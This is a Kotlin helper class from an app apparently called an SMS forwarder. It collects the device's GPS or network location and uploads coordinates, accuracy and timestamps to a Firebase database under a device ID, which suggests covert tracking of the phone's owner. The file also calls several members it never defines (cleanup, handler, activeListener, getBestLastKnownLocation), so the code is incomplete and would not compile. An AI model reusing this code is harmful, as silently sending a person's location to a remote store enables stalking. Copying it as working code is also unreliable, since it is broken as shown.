package com.smsforwarder.utils

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.os.Looper
import android.util.Log
import androidx.core.content.ContextCompat
import com.google.firebase.database.FirebaseDatabase

class LocationHelper(private val context: Context) {

    private val deviceId = DeviceUtils.getUniqueDeviceId(context)

    companion object {
        private const val TAG = "LocationHelper"
    }

    fun fetchAndUploadLocation() {
    if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
        != PackageManager.PERMISSION_GRANTED) {
        Log.e(TAG, "❌ Location permission not granted")
        return
    }

    val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
    cleanup(locationManager)

    try {
        // Last known pehle bhej do
        val lastKnown = getBestLastKnownLocation(locationManager)
        if (lastKnown != null) {
            Log.d(TAG, "✅ Last known → ${lastKnown.latitude}, ${lastKnown.longitude} (acc: ${lastKnown.accuracy})")
            uploadLocationToFirebase(lastKnown)
        }

        Log.d(TAG, "⏳ Requesting fresh location (waiting for better accuracy)...")

        var bestLocation: Location? = null

        val listener = object : LocationListener {
            override fun onLocationChanged(location: Location) {
                Log.d(TAG, "📍 New location → acc: ${location.accuracy}m")

                // Better accuracy mili to update karo
                if (bestLocation == null || location.accuracy < bestLocation!!.accuracy) {
                    bestLocation = location
                    uploadLocationToFirebase(location)
                }

                // Agar accuracy 50m se better ho gayi to band kar do
                if (location.accuracy <= 50f) {
                    Log.d(TAG, "✅ Good accuracy achieved, stopping")
                    cleanup(locationManager)
                }
            }

            override fun onProviderEnabled(provider: String) {}
            override fun onProviderDisabled(provider: String) {}
            @Deprecated("Deprecated in Java")
            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
        }

        activeListener = listener

        if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
            locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER, 1000L, 0f, listener, Looper.getMainLooper()
            )
        }
        if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
            locationManager.requestLocationUpdates(
                LocationManager.NETWORK_PROVIDER, 1000L, 0f, listener, Looper.getMainLooper()
            )
        }

        // Maximum 20 second wait karo
        handler.postDelayed({
            Log.w(TAG, "⏰ Timeout — using best location so far")
            cleanup(locationManager)
        }, 20_000)

    } catch (e: Exception) {
        Log.e(TAG, "❌ Location Error: ${e.message}")
    }
}

    private fun uploadLocationToFirebase(location: Location) {
        val data = mapOf(
            "latitude" to location.latitude,
            "longitude" to location.longitude,
            "accuracy" to location.accuracy,
            "timestamp" to System.currentTimeMillis()
        )
        val firebaseUrl = ConfigReader.getFirebaseUrl(context)
        FirebaseDatabase.getInstance(firebaseUrl)
            .getReference("devices/$deviceId/location")
            .setValue(data)
            .addOnSuccessListener { Log.d(TAG, "✅ Location uploaded to Firebase") }
            .addOnFailureListener { e -> Log.e(TAG, "❌ Failed to upload location: ${e.message}") }
    }
}
